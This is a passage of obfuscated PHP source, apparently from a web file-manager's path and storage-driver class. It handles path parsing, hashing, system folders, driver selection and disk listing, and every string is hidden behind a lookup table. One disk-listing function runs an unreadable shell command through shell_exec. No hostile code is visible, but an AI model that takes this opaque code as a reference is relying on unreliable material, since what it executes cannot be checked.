$ì¡úò¿Ì[1398] => self::KOD_USER_SHARE_LINK, $ì¡úò¿Ì[1399] => self::KOD_USER_SHARE_TO_ME, $ì¡úò¿Ì[1400] => self::KOD_SHARE_ITEM, $ì¡úò¿Ì[1401] => self::KOD_SHARE_LINK, $ì¡úò¿Ì[1402] => self::KOD_SEARCH, $ì¡úò¿Ì[1403] => self::KOD_BLOCK, $ì¡úò¿Ì[1404] => self::KOD_IO, $ì¡úò¿Ì[1405] => self::KOD_USER_RECENT, $ì¡úò¿Ì[1406] => self::KOD_USER_DRIVER); } public static function parse($‰¢“íÛ´) { $Ş­¶¼÷ =& $_SERVER[¬ÏÕ§Áú]; $‰¢“íÛ´ = self::clear($‰¢“íÛ´); $˜±íÆÚ¢ = array_values(self::typeList()); preg_match($Ş­¶¼÷[1407], $‰¢“íÛ´, $éğŞ’±Æ); $ìú™¬ı« = array($Ş­¶¼÷[516] => !1, $Ş­¶¼÷[1408] => !1, $Ş­¶¼÷[513] => !1, $Ş­¶¼÷[97] => $‰¢“íÛ´, $Ş­¶¼÷[1305] => !1, $Ş­¶¼÷[1304] => $Ş­¶¼÷[12]); if (is_array($éğŞ’±Æ) && count($éğŞ’±Æ) == 5) { $½¹æµƒñ = $Ş­¶¼÷[1409] . $éğŞ’±Æ[2] . $Ş­¶¼÷[413]; if (in_array($½¹æµƒñ, $˜±íÆÚ¢)) { $ìú™¬ı«[$Ş­¶¼÷[1305]] = $éğŞ’±Æ[1]; $ìú™¬ı«[$Ş­¶¼÷[33]] = $½¹æµƒñ; $ìú™¬ı«[$Ş­¶¼÷[1410]] = substr($½¹æµƒñ, 1, -1); $ìú™¬ı«[$Ş­¶¼÷[492]] = $éğŞ’±Æ[3]; } $ìú™¬ı«[$Ş­¶¼÷[1304]] = $éğŞ’±Æ[4]; } if ($ìú™¬ı«[$Ş­¶¼÷[516]] == self::KOD_SOURCE) { $ìú™¬ı«[$Ş­¶¼÷[492]] = intval($ìú™¬ı«[$Ş­¶¼÷[492]]); $ìú™¬ı«[$Ş­¶¼÷[1308]] = $ìú™¬ı«[$Ş­¶¼÷[492]]; } $Ô¨Ï¸” = array($Ş­¶¼÷[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ìú™¬ı«[$Ş­¶¼÷[1373]] = in_array($ìú™¬ı«[$Ş­¶¼÷[33]], $Ô¨Ï¸”); return $ìú™¬ı«; } public static function isTruePath($ã…ã×ü) { $¶ÆÙË•õ =& $_SERVER[¬ÏÕ§Áú]; if (substr($ã…ã×ü, 0, 1) != $¶ÆÙË•õ[1409]) { return !0; } if (strpos($ã…ã×ü, $¶ÆÙË•õ[503]) === 0) { return !0; } if (strpos($ã…ã×ü, $¶ÆÙË•õ[1377]) === 0) { return !0; } if (strpos($ã…ã×ü, $¶ÆÙË•õ[1411]) === 0) { return !0; } if (strpos($ã…ã×ü, $¶ÆÙË•õ[1412]) === 0) { return !0; } if (strpos($ã…ã×ü, $¶ÆÙË•õ[1413]) === 0) { return !0; } return !1; } public static function clear($‘¼Ğõº) { $¡ÇÌŠğ =& $_SERVER[¬ÏÕ§Áú]; $‘¼Ğõº = str_replace(array($¡ÇÌŠğ[1206], $¡ÇÌŠğ[65]), $¡ÇÌŠğ[53], $‘¼Ğõº); $‘¼Ğõº = str_replace($¡ÇÌŠğ[110], $¡ÇÌŠğ[8], $‘¼Ğõº); $×öËï¤ = $¡ÇÌŠğ[1414]; if (substr($‘¼Ğõº, 0, 3) == $¡ÇÌŠğ[1415]) { $‘¼Ğõº = substr($‘¼Ğõº, 3); } while (strstr($‘¼Ğõº, $×öËï¤)) { $‘¼Ğõº = str_replace($×öËï¤, $¡ÇÌŠğ[8], $‘¼Ğõº); } $‘¼Ğõº = preg_replace($¡ÇÌŠğ[1416], $¡ÇÌŠğ[8], $‘¼Ğõº); if ($‘¼Ğõº == $¡ÇÌŠğ[8]) { return $¡ÇÌŠğ[8]; } $‘¼Ğõº = rtrim($‘¼Ğõº, $¡ÇÌŠğ[8]); return $‘¼Ğõº; } public static function pathTrue($†…Ó‡ïË) { $ƒ’£¢¨ =& $_SERVER[¬ÏÕ§Áú]; if (!$†…Ó‡ïË) { return $ƒ’£¢¨[12]; } $†…Ó‡ïË = str_replace($ƒ’£¢¨[267], $ƒ’£¢¨[8], str_replace($ƒ’£¢¨[1417], $ƒ’£¢¨[8], $†…Ó‡ïË)); $†…Ó‡ïË = str_replace($ƒ’£¢¨[267], $ƒ’£¢¨[8], str_replace($ƒ’£¢¨[1417], $ƒ’£¢¨[8], $†…Ó‡ïË)); if (!strstr($†…Ó‡ïË, $ƒ’£¢¨[1415])) { return $†…Ó‡ïË; } $é´¿¶Ëğ = explode($ƒ’£¢¨[8], $†…Ó‡ïË); foreach ($é´¿¶Ëğ as $›ˆ§Áöæ => $®€ã¯±ß) { if ($®€ã¯±ß !== $ƒ’£¢¨[1418]) { continue; } for ($Ú”íø‰Ò = $›ˆ§Áöæ; $Ú”íø‰Ò >= 0; $Ú”íø‰Ò--) { if ($é´¿¶Ëğ[$Ú”íø‰Ò] === $ƒ’£¢¨[10] || $é´¿¶Ëğ[$Ú”íø‰Ò] === $ƒ’£¢¨[1418] || $é´¿¶Ëğ[$Ú”íø‰Ò] === -1) { continue; } if ($é´¿¶Ëğ[$Ú”íø‰Ò] === $ƒ’£¢¨[12]) { $é´¿¶Ëğ[$›ˆ§Áöæ] = -1; break; } $é´¿¶Ëğ[$›ˆ§Áöæ] = -1; $é´¿¶Ëğ[$Ú”íø‰Ò] = -1; break; } } $ÆÂŸ¢Ş± = array(); foreach ($é´¿¶Ëğ as $®€ã¯±ß) { if ($®€ã¯±ß !== -1) { $ÆÂŸ¢Ş±[] = $®€ã¯±ß; } } $±êÀ¨ƒ… = implode($ƒ’£¢¨[8], $ÆÂŸ¢Ş±); if (strpos($±êÀ¨ƒ…, $ƒ’£¢¨[1419]) === 0) { $±êÀ¨ƒ… = $ƒ’£¢¨[1415] . substr($±êÀ¨ƒ…, strlen($ƒ’£¢¨[1419])); } return $±êÀ¨ƒ…; } public static function pathUrlClear($‘¥›õÄõ) { $ãÆ¦ª² =& $_SERVER[¬ÏÕ§Áú]; if (!$‘¥›õÄõ) { return $‘¥›õÄõ; } $‘¥›õÄõ = rawurldecode($‘¥›õÄõ); $‘¥›õÄõ = str_replace($ãÆ¦ª²[1417], $ãÆ¦ª²[8], $‘¥›õÄõ); if (strpos($‘¥›õÄõ, $ãÆ¦ª²[86]) > 0) { $‘¥›õÄõ = substr($‘¥›õÄõ, 0, strpos($‘¥›õÄõ, $ãÆ¦ª²[86])); } if (strpos($‘¥›õÄõ, $ãÆ¦ª²[1420]) > 0) { $‘¥›õÄõ = substr($‘¥›õÄõ, 0, strpos($‘¥›õÄõ, $ãÆ¦ª²[1420])); } return $‘¥›õÄõ; } public static function sourceID($´¡À²¥Ğ) { $´†á—°— =& $_SERVER[¬ÏÕ§Áú]; $â’Ï›û• = self::parse($´¡À²¥Ğ); if ($â’Ï›û•[$´†á—°—[33]] !== self::KOD_SOURCE) { show_json(LNG($´†á—°—[1421]), !1); } return $â’Ï›û•[$´†á—°—[492]]; } public static function make($õÃÅ’úî) { if (!$õÃÅ’úî) { return !1; } return self::makePath(self::KOD_SOURCE, intval($õÃÅ’úî)); } public static function makeShare($ıÈ¸ù±, $Õ¼í¼ª) { return self::makePath(self::KOD_SHARE_ITEM, $ıÈ¸ù±, $Õ¼í¼ª); } public static function makeFileTypePath($‘»¿ï²Ô) { return self::makePath(self::KOD_USER_FILE_TYPE, $‘»¿ï²Ô); } public static function makeFileTagPath($ÊŒÃÌ´’) { return self::makePath(self::KOD_USER_FILE_TAG, $ÊŒÃÌ´’); } public static function makePath($ü« ©„•, $¬ä¡âô = '', $ööí ç¼ = '') { $±ÆªÙÎÈ =& $_SERVER[¬ÏÕ§Áú]; $Öå½¨‹Ú = substr($ü« ©„•, 1, -1); $áø±ıæ = $±ÆªÙÎÈ[1422] . $Öå½¨‹Ú . $±ÆªÙÎÈ[1423] . $¬ä¡âô . $±ÆªÙÎÈ[1424]; $áø±ıæ = $ööí ç¼ ? $áø±ıæ . $ööí ç¼ . $±ÆªÙÎÈ[8] : $áø±ıæ; return $áø±ıæ; } public static function hashPath($Ş™âŸ¨Ì, $¿áŠæ‰› = false) { $‰ùË¡Á =& $_SERVER[¬ÏÕ§Áú]; if (!$Ş™âŸ¨Ì) { return $‰ùË¡Á[12]; } $ Ğ’Üí¬ = is_array($Ş™âŸ¨Ì) ? $Ş™âŸ¨Ì : IO::info($Ş™âŸ¨Ì); $„Èº£ º = _get($ Ğ’Üí¬, $‰ùË¡Á[1425], $‰ùË¡Á[12]); if (!$„Èº£ º && isset($ Ğ’Üí¬[$‰ùË¡Á[562]])) { $„Èº£ º = $ Ğ’Üí¬[$‰ùË¡Á[562]]; } if (!$„Èº£ º && isset($ Ğ’Üí¬[$‰ùË¡Á[248]])) { $„Èº£ º = trim($ Ğ’Üí¬[$‰ùË¡Á[248]], $‰ùË¡Á[131]); } if ($„Èº£ º) { return $„Èº£ º; } if (!$„Èº£ º && isset($ Ğ’Üí¬[$‰ùË¡Á[204]]) && $ Ğ’Üí¬[$‰ùË¡Á[204]]) { $ Ğ’Üí¬ = IO::info(KodIO::make($ Ğ’Üí¬[$‰ùË¡Á[204]])); $„Èº£ º = _get($ Ğ’Üí¬, $‰ùË¡Á[1425], $‰ùË¡Á[12]); if (!$„Èº£ º && isset($ Ğ’Üí¬[$‰ùË¡Á[562]])) { $„Èº£ º = $ Ğ’Üí¬[$‰ùË¡Á[562]]; } } $ûĞœĞÆÂ = md5($ Ğ’Üí¬[$‰ùË¡Á[97]] . $ Ğ’Üí¬[$‰ùË¡Á[89]] . $ Ğ’Üí¬[$‰ùË¡Á[98]]); $•Å¦Ş«é = $ûĞœĞÆÂ . $‰ùË¡Á[1426]; $„Èº£ º = $„Èº£ º ? $„Èº£ º : Cache::get($•Å¦Ş«é); if (!$„Èº£ º && $¿áŠæ‰›) { $„Èº£ º = IO::hashSimple($ Ğ’Üí¬[$‰ùË¡Á[97]]); Cache::set($•Å¦Ş«é, $„Èº£ º ? $„Èº£ º : $ûĞœĞÆÂ, 3600 * 24 * 30); } return $„Èº£ º ? $„Èº£ º : $ûĞœĞÆÂ; } public static function hashPathSafe($²àîÌÜ», $úÈŒ… = false) { $é¿ÅÃö³ =& $_SERVER[¬ÏÕ§Áú]; $ĞÚğåÉŠ = self::hashPath($²àîÌÜ», $úÈŒ…); return md5($ĞÚğåÉŠ . $é¿ÅÃö³[1427] . Model($é¿ÅÃö³[886])->get($é¿ÅÃö³[887])); } public static function initSystemPath() { $ºŸ‚æß§ =& $_SERVER[¬ÏÕ§Áú]; if (defined($ºŸ‚æß§[1428])) { return; } define($ºŸ‚æß§[1428], self::systemPath($ºŸ‚æß§[202])); define($ºŸ‚æß§[1429], self::systemPath($ºŸ‚æß§[1430])); define($ºŸ‚æß§[1431], self::systemPath($ºŸ‚æß§[1432])); define($ºŸ‚æß§[1433], self::systemPath($ºŸ‚æß§[1434])); IOHistory::bindEvent(); } public static function systemPath($İæÌµáÒ) { $Ñô±˜Û³ =& $_SERVER[¬ÏÕ§Áú]; $¦Ä—¢ = $Ñô±˜Û³[1435] . ucfirst($İæÌµáÒ); $‰òÓşÚ = Model($Ñô±˜Û³[886])->get($¦Ä—¢); if ($‰òÓşÚ) { return $‰òÓşÚ; } if ($İæÌµáÒ == $Ñô±˜Û³[202]) { $‰òÓşÚ = self::make(Model($Ñô±˜Û³[946])->systemRootPathAdd($Ñô±˜Û³[629])); } else { $‰òÓşÚ = self::systemPath($Ñô±˜Û³[202]); $¾¦ÜìÅ = self::sourceID($‰òÓşÚ); $‰òÓşÚ = self::make(Model($Ñô±˜Û³[946])->mkdir($¾¦ÜìÅ, $İæÌµáÒ)); } Model($Ñô±˜Û³[886])->set($¦Ä—¢, $‰òÓşÚ); return $‰òÓşÚ; } public static function systemFolder($¯µªÍÖß) { $÷óÛÔêê = IO_PATH_SYSTEM_SOURCE . $¯µªÍÖß; $µ´ïé¯¿ = Cache::get($÷óÛÔêê); if (!$µ´ïé¯¿) { $ô–Å¨Áã = IO::infoFullSimple($÷óÛÔêê); if (!$ô–Å¨Áã) { $µ´ïé¯¿ = IO::mkdir($÷óÛÔêê, REPEAT_SKIP); } else { $µ´ïé¯¿ = $ô–Å¨Áã[$_SERVER[¬ÏÕ§Áú][97]]; } Cache::set($÷óÛÔêê, $µ´ïé¯¿, 3600 * 10); } return $µ´ïé¯¿; } public static function defaultDriver() { return Model($_SERVER[¬ÏÕ§Áú][881])->defaultDriver(); } public static function defaultDriverInit() { $·¬éƒ¿é =& $_SERVER[¬ÏÕ§Áú]; static $íç»Š©¾ = false; if ($íç»Š©¾) { return $íç»Š©¾; } $ÂÅáÏÖï = self::defaultDriver(); $íç»Š©¾ = IO::init($·¬éƒ¿é[1436] . $ÂÅáÏÖï[$·¬éƒ¿é[492]] . $·¬éƒ¿é[1424]); return $íç»Š©¾; } public static function fileTypeList() { $ı„Ñ˜Ó =& $_SERVER[¬ÏÕ§Áú]; $—¤œ§œ = $GLOBALS[$ı„Ñ˜Ó[6]][$ı„Ñ˜Ó[1437]]; foreach ($—¤œ§œ as $¤¸‰ß›‡ => $á¦»’ªı) { $¢ÖÏ÷ = $ı„Ñ˜Ó[1438] . $¤¸‰ß›‡; $·ÀÖ–ÒÂ = LNG($¢ÖÏ÷); if ($¢ÖÏ÷ != $·ÀÖ–ÒÂ) { $—¤œ§œ[$¤¸‰ß›‡][$ı„Ñ˜Ó[32]] = $·ÀÖ–ÒÂ; } } return $—¤œ§œ; } public static function ioFileDriverGet($Ş‚í”‰Å = '') { $òÒ…÷‰ç =& $_SERVER[¬ÏÕ§Áú]; static $…­Ó·Ì = array(); static $àêÜõõş = array(); static $ˆÃ×¥ìˆ = array(); static $Ìô™î¢Ô = false; if ($Ìô™î¢Ô === !1) { $Ìô™î¢Ô = array($òÒ…÷‰ç[599] => array(), $òÒ…÷‰ç[686] => array()); $œš÷èø = Model($òÒ…÷‰ç[1439])->get(!1, $òÒ…÷‰ç[1440]); foreach ($œš÷èø as $¶Ÿ„³ => $¿òùÀë—) { if (!$¿òùÀë— || $¿òùÀë— == $òÒ…÷‰ç[12]) { continue; } if (strstr($¶Ÿ„³, $òÒ…÷‰ç[1441])) { $â¥öç = str_replace($òÒ…÷‰ç[1441], $òÒ…÷‰ç[12], $¶Ÿ„³); $Ìô™î¢Ô[$òÒ…÷‰ç[599]][$â¥öç] = $¿òùÀë—; } else { if (strstr($¶Ÿ„³, $òÒ…÷‰ç[1442])) { $â¥öç = str_replace($òÒ…÷‰ç[1442], $òÒ…÷‰ç[12], $¶Ÿ„³); $Ìô™î¢Ô[$òÒ…÷‰ç[686]][$â¥öç] = $¿òùÀë—; } } } } $¤šÒÚŸ = self::defaultDriver(); if (!$Ş‚í”‰Å || !$Ìô™î¢Ô[$òÒ…÷‰ç[599]] && !$Ìô™î¢Ô[$òÒ…÷‰ç[686]]) { return $¤šÒÚŸ; } $Ù‘ÑˆÀ¶ = self::getPathSourceID($Ş‚í”‰Å); if (!$Ù‘ÑˆÀ¶) { return $¤šÒÚŸ; } if (isset($…­Ó·Ì[$Ù‘ÑˆÀ¶])) { return $…­Ó·Ì[$Ù‘ÑˆÀ¶]; } $Í½û†·¥ = Model($òÒ…÷‰ç[946])->sourceInfo($Ù‘ÑˆÀ¶); $ƒÂåŞÍ = $Í½û†·¥[$òÒ…÷‰ç[590]]; $ıÛñüÖË = array(); if (!$Í½û†·¥) { return $¤šÒÚŸ; } if ($Í½û†·¥[$òÒ…÷‰ç[201]] == $òÒ…÷‰ç[101]) { if (isset($ˆÃ×¥ìˆ[$ƒÂåŞÍ])) { return $ˆÃ×¥ìˆ[$ƒÂåŞÍ]; } if (isset($Ìô™î¢Ô[$òÒ…÷‰ç[686]][$ƒÂåŞÍ])) { $¢ãŞ¥„» = Model($òÒ…÷‰ç[881])->driverInfo($Ìô™î¢Ô[$òÒ…÷‰ç[686]][$ƒÂåŞÍ]); $¤šÒÚŸ = $¢ãŞ¥„» ? $¢ãŞ¥„» : $¤šÒÚŸ; $ˆÃ×¥ìˆ[$ƒÂåŞÍ] = $¤šÒÚŸ; $…­Ó·Ì[$Ù‘ÑˆÀ¶] = $¤šÒÚŸ; return $¤šÒÚŸ; } $ıÛñüÖË = self::groupParentUser($ƒÂåŞÍ); } else { if ($Í½û†·¥[$òÒ…÷‰ç[201]] == $òÒ…÷‰ç[529]) { $Ï–ØÛüû = Model($òÒ…÷‰ç[1443])->getInfo($ƒÂåŞÍ); if ($Ï–ØÛüû) { $ıÛñüÖË = explode($òÒ…÷‰ç[50], trim($Ï–ØÛüû[$òÒ…÷‰ç[605]], $òÒ…÷‰ç[50])); $ıÛñüÖË = array_remove_value($ıÛñüÖË, $òÒ…÷‰ç[241]); $ıÛñüÖË[] = $ƒÂåŞÍ; $ıÛñüÖË = array_reverse($ıÛñüÖË); } } } foreach ($ıÛñüÖË as $’ÃÜê§“) { if (!isset($Ìô™î¢Ô[$òÒ…÷‰ç[599]][$’ÃÜê§“])) { continue; } if (isset($àêÜõõş[$’ÃÜê§“])) { return $àêÜõõş[$’ÃÜê§“]; } $¢ãŞ¥„» = Model($òÒ…÷‰ç[881])->driverInfo($Ìô™î¢Ô[$òÒ…÷‰ç[599]][$’ÃÜê§“]); $¤šÒÚŸ = $¢ãŞ¥„» ? $¢ãŞ¥„» : $¤šÒÚŸ; $àêÜõõş[$’ÃÜê§“] = $¤šÒÚŸ; break; } if ($Í½û†·¥[$òÒ…÷‰ç[201]] == $òÒ…÷‰ç[101]) { $ˆÃ×¥ìˆ[$ƒÂåŞÍ] = $¤šÒÚŸ; } $…­Ó·Ì[$Ù‘ÑˆÀ¶] = $¤šÒÚŸ; return $¤šÒÚŸ; } private static function getPathSourceID($«²–Ÿ®ì) { $ˆöõ—Áô =& $_SERVER[¬ÏÕ§Áú]; static $ÃÑóÔâì = array(); if (!$«²–Ÿ®ì) { return $ˆöõ—Áô[12]; } $Â‹¤ç³“ = substr($«²–Ÿ®ì, 0, strlen($ˆöõ—Áô[503])) == $ˆöõ—Áô[503]; $şƒÔÙÒ’ = substr($«²–Ÿ®ì, 0, strlen($ˆöõ—Áô[1411])) == $ˆöõ—Áô[1411]; $ÔŸ€šˆ‰ = substr($«²–Ÿ®ì, 0, strlen($ˆöõ—Áô[1412])) == $ˆöõ—Áô[1412]; if (!$Â‹¤ç³“ && !$şƒÔÙÒ’ && !$ÔŸ€šˆ‰) { return $ˆöõ—Áô[12]; } $¿Î‹Ö˜ = self::parse($«²–Ÿ®ì); $»Õ‡™ = $¿Î‹Ö˜[$ˆöõ—Áô[1305]]; if ($Â‹¤ç³“) { return $¿Î‹Ö˜[$ˆöõ—Áô[492]]; } if (isset($ÃÑóÔâì[$»Õ‡™])) { $õìÌ¢ğÃ = $ÃÑóÔâì[$»Õ‡™]; } else { $õìÌ¢ğÃ = IO::init($»Õ‡™); $ÃÑóÔâì[$»Õ‡™] = $õìÌ¢ğÃ; } if (isset($õìÌ¢ğÃ->pathParse[$ˆöõ—Áô[1308]])) { return $õìÌ¢ğÃ->pathParse[$ˆöõ—Áô[1308]]; } return $ˆöõ—Áô[12]; } private static function groupParentUser($ªå¦ı£Ê) { $²ì§õô =& $_SERVER[¬ÏÕ§Áú]; $Âä”ÙÑ— = Model($²ì§õô[618])->getInfo($ªå¦ı£Ê); if (!$Âä”ÙÑ—) { return array(); } $ŒÙÒ½œ„ = array_to_keyvalue($Âä”ÙÑ—[$²ì§õô[1444]], $²ì§õô[12], $²ì§õô[1445]); $ºµ¡òÜ‚ = array(); foreach ($Âä”ÙÑ—[$²ì§õô[1444]] as $ŠÆÏßû) { $ºµ¡òÜ‚[] = $ŠÆÏßû[$²ì§õô[1445]]; $ñ¤­§Áñ = explode($²ì§õô[50], trim($ŠÆÏßû[$²ì§õô[605]], $²ì§õô[50])); $ñ¤­§Áñ = array_remove_value($ñ¤­§Áñ, $²ì§õô[241]); $ñ¤­§Áñ = array_reverse($ñ¤­§Áñ); $ºµ¡òÜ‚ = array_merge($ºµ¡òÜ‚, $ñ¤­§Áñ); } return array_unique($ºµ¡òÜ‚); } public static function diskList($‚û ïºÂ = true) { $œà€‚ù˜ = $_SERVER[¬ÏÕ§Áú][1446]; if ($‚û ïºÂ) { $Ãåôş¤í = Cache::get($œà€‚ù˜); if (is_array($Ãåôş¤í)) { return $Ãåôş¤í; } } $Ãåôş¤í = self::diskListGet(); Cache::set($œà€‚ù˜, $Ãåôş¤í, 60); return $Ãåôş¤í; } public static function diskListGet() { $ø„§½¡÷ =& $_SERVER[¬ÏÕ§Áú]; $ªõ„Øà“ = array(); if ($GLOBALS[$ø„§½¡÷[6]][$ø„§½¡÷[1447]] == $ø„§½¡÷[1448]) { $²ÂÑñ…ê = $ø„§½¡÷[1449]; for ($ç‘…ñ³ = 0; $ç‘…ñ³ < strlen($²ÂÑñ…ê); $ç‘…ñ³++) { $îâš¹ Æ = $²ÂÑñ…ê[$ç‘…ñ³] . $ø„§½¡÷[1450]; if (file_exists($îâš¹ Æ)) { $ªõ„Øà“[] = $îâš¹ Æ; } } return $ªõ„Øà“; } if (!function_exists($ø„§½¡÷[111])) { $ªõ„Øà“[] = $ø„§½¡÷[960]; return $ªõ„Øà“; } $ÁÕ¿æ¤ü = explode($ø„§½¡÷[65], shell_exec($ø„§½¡÷[1451])); array_shift($ÁÕ¿æ¤ü); array_pop($ÁÕ¿æ¤ü); $‘ªù™ôè = array($ø„§½¡÷[1452], $ø„§½¡÷[1453], $ø„§½¡÷[1454], $ø„§½¡÷[1455], $ø„§½¡÷[1456], $ø„§½¡÷[1457], $ø„§½¡÷[1458], $ø„§½¡÷[1459]); foreach ($ÁÕ¿æ¤ü as $õÀèÚ¸ª) { $§½œ†£ = preg_split($ø„§½¡÷[1460], $õÀèÚ¸ª); $îâš¹ Æ = $§½œ†£[count($§½œ†£) - 1]; if (!strstr($§½œ†£[0], $ø„§½¡÷[1461]) || !$îâš¹ Æ) { continue; } $†‡®Ê®¬ = rtrim($îâš¹ Æ, $ø„§½¡÷[8]) . $ø„§½¡÷[8]; if (in_array($†‡®Ê®¬, $‘ªù™ôè)) { continue; } $ªõ„Øà“[] = $†‡®Ê®¬; } return $ªõ„Øà“; } public static function isSameDisk($í’ß¾Œş, $±ˆèâëÒ) { $í¡¹ù™Ç =& $_SERVER[¬ÏÕ§Áú]; if ($GLOBALS[$í¡¹ù™Ç[6]][$í¡¹ù™Ç[1447]] == $í¡¹ù™Ç[1448]) { return strtolower(substr($í’ß¾Œş, 0, 1)) == strtolower(substr($±ˆèâëÒ, 0, 1)); } $Ë¯«ªµ­ = stat($í’ß¾Œş); $Â¸šŠÒÉ = stat($±ˆèâëÒ); if ($Ë¯«ªµ­ === !1 || $Â¸šŠÒÉ === !1) { return !1; } return $Ë¯«ªµ­[$í¡¹ù™Ç[1462]] === $Â¸šŠÒÉ[$í¡¹ù™Ç[1462]]; $Ú÷ûª³ = self::diskList(); $ùí¤ƒØ = !1; $‡õüüïş = !1; sort($Ú÷ûª³); $Ú÷ûª³ = array_reverse($Ú÷ûª³); $í’ß¾Œş = rtrim($í’ß¾Œş, $í¡¹ù™Ç[8]) . $í¡¹ù™Ç[8]; $±ˆèâëÒ = rtrim($±ˆèâëÒ, $í¡¹ù™Ç[8]) . $í¡¹ù™Ç[8]; foreach ($Ú÷ûª³ as $½èª±¥‹) { $–óØÕĞ¢ = strlen($½èª±¥‹); if (!$ùí¤ƒØ && substr($í’ß¾Œş, 0, $–óØÕĞ¢) == $½èª±¥‹) { $ùí¤ƒØ = $½èª±¥‹; } if (!$‡õüüïş && substr($±ˆèâëÒ, 0, $–óØÕĞ¢) == $½èª±¥‹) { $‡õüüïş = $½èª±¥‹; } if ($ùí¤ƒØ && $‡õüüïş) { break; } } return $ùí¤ƒØ === $‡õüüïş; } public static function transferType($œôËö÷, $ØÛˆ˜Š) { $Ûú‘„ßÇ =& $_SERVER[¬ÏÕ§Áú]; $æçäÈ—¡ = self::driverType($œôËö÷); $·èƒã = self::driverType($ØÛˆ˜Š); if ($æçäÈ—¡[$Ûú‘„ßÇ[33]] == $·èƒã[$Ûú‘„ßÇ[33]] && $æçäÈ—¡[$Ûú‘„ßÇ[1463]] == $·èƒã[$Ûú‘„ßÇ[1463]]) { return $Ûú‘„ßÇ[1464]; } if ($æçäÈ—¡[$Ûú‘„ßÇ[33]] == $Ûú‘„ßÇ[994] && $·èƒã[$Ûú‘„ßÇ[33]] == $Ûú‘„ßÇ[119]) { return $Ûú‘„ßÇ[1334]; } if ($æçäÈ—¡[$Ûú‘„ßÇ[33]] == $Ûú‘„ßÇ[119] && $·èƒã[$Ûú‘„ßÇ[33]] == $Ûú‘„ßÇ[994]) { return $Ûú‘„ßÇ[120]; } return $Ûú‘„ßÇ[1465]; } public static function driverType($ú¹îüğ¹) { $÷º¸‘Šµ =& $_SERVER[¬ÏÕ§Áú]; $ï¶Ü÷Åµ = str_replace($÷º¸‘Šµ[1466], $÷º¸‘Šµ[12], strtolower($ú¹îüğ¹->getType())); if ($ï¶Ü÷Åµ == $÷º¸‘Šµ[871] || $ï¶Ü÷Åµ == $÷º¸‘Šµ[1467] || $ï¶Ü÷Åµ == $÷º¸‘Šµ[1468]) { $µŠ–˜İˆ = self::ioFileDriverGet($÷º¸‘Šµ[503] . $ú¹îüğ¹->pathParse[$÷º¸‘Šµ[1308]] . $÷º¸‘Šµ[413]); $ú¹îüğ¹ = IO::init($÷º¸‘Šµ[1436] . $µŠ–˜İˆ[$÷º¸‘Šµ[492]] . $÷º¸‘Šµ[1424]); } else { if ($ï¶Ü÷Åµ == $÷º¸‘Šµ[1344] || $ï¶Ü÷Åµ == $÷º¸‘Šµ[1469]) { $ú¹îüğ¹ = IO::init($ú¹îüğ¹->pathParse[$÷º¸‘Šµ[1285]]); } } $ú£ÏªÕ÷ = $ú¹îüğ¹->path; $ï¶Ü÷Åµ = str_replace($÷º¸‘Šµ[1466], $÷º¸‘Šµ[12], strtolower($ú¹îüğ¹->getType())); if ($ï¶Ü÷Åµ == $÷º¸‘Šµ[119]) { return array($÷º¸‘Šµ[33] => $÷º¸‘Šµ[119], $÷º¸‘Šµ[1463] => $÷º¸‘Šµ[12], $÷º¸‘Šµ[97] => $ú£ÏªÕ÷, $÷º¸‘Šµ[108] => $ú¹îüğ¹); } return array($÷º¸‘Šµ[33] => $÷º¸‘Šµ[994], $÷º¸‘Šµ[1463] => $ú¹îüğ¹->pathDriver, $÷º¸‘Šµ[97] => $ú£ÏªÕ÷, $÷º¸‘Šµ[108] => $ú¹îüğ¹); } public static function pathDriverType($¶‡›ÈËß) { return $¶‡›ÈËß ? self::driverType(IO::init($¶‡›ÈËß)) : !1; } public static function pathDriverLocal($¯­¡¼£) { $è¨¼¢‡ =& $_SERVER[¬ÏÕ§Áú]; $ñå¥õİí = $¯­¡¼£ ? self::driverType(IO::init($¯­¡¼£)) : !1; return strtolower($ñå¥õİí[$è¨¼¢‡[33]]) == $è¨¼¢‡[119] ? !0 : !1; } public static function allowCover($°®³ÊÍß, $°¶ËûêÁ = true) { $ğô­¯© =& $_SERVER[¬ÏÕ§Áú]; if (is_string($°®³ÊÍß)) { $°®³ÊÍß = IO::info($°®³ÊÍß); } if (!$°®³ÊÍß || $°®³ÊÍß[$ğô­¯©[33]] == $ğô­¯©[88] || $°®³ÊÍß[$ğô­¯©[89]] <= 100) { return !1; } if (isset($°®³ÊÍß[$ğô­¯©[1470]]) || !$°®³ÊÍß[$ğô­¯©[97]]) { return !1; } if (isset($°®³ÊÍß[$ğô­¯©[245]]) && !$°®³ÊÍß[$ğô­¯©[245]]) { return !1; } static $Œ…è˜áş = false; if (!$Œ…è˜áş || !$°¶ËûêÁ) { $äı³˜Ï‰ = self::driverType(IO::init($°®³ÊÍß[$ğô­¯©[97]])); $›áéÔ®Ó = $äı³˜Ï‰[$ğô­¯©[108]]; $Œ…è˜áş = $ğô­¯©[207]; if ($äı³˜Ï‰[$ğô­¯©[33]] == $ğô­¯©[119]) { $Œ…è˜áş = $ğô­¯©[1471]; } if ($äı³˜Ï‰[$ğô­¯©[108]] && is_array($äı³˜Ï‰[$ğô­¯©[108]]->config)) { $ğ”­Úüä = $äı³˜Ï‰[$ğô­¯©[108]]->config; if (isset($ğ”­Úüä[$ğô­¯©[1472]]) && $ğ”­Úüä[$ğô­¯©[1472]]) { $Œ…è˜áş = $ğô­¯©[1471]; } } $˜Õ·ˆò‰ = KodIO::defaultDriver(); if (strtolower($˜Õ·ˆò‰[$ğô­¯©[108]]) == $ğô­¯©[119] && is_array($˜Õ·ˆò‰[$ğô­¯©[6]])) { $Î·Ô¬å = $˜Õ·ˆò‰[$ğô­¯©[6]][$ğô­¯©[1317]]; if (substr($Î·Ô¬å, 0, 2) == $ğô­¯©[1473]) { $Î·Ô¬å = str_replace($ğô­¯©[1473], BASIC_PATH, $Î·Ô¬å); } $Î·Ô¬å = str_replace($ğô­¯©[267], $ğô­¯©[8], $Î·Ô¬å); if (substr($°®³ÊÍß[$ğô­¯©[97]], 0, strlen($Î·Ô¬å)) == $Î·Ô¬å) { $Œ…è˜áş = $ğô­¯©[207]; } } } return $Œ…è˜áş == $ğô­¯©[1471] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($¯é²½‘) { parent::__construct($¯é²½‘); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function 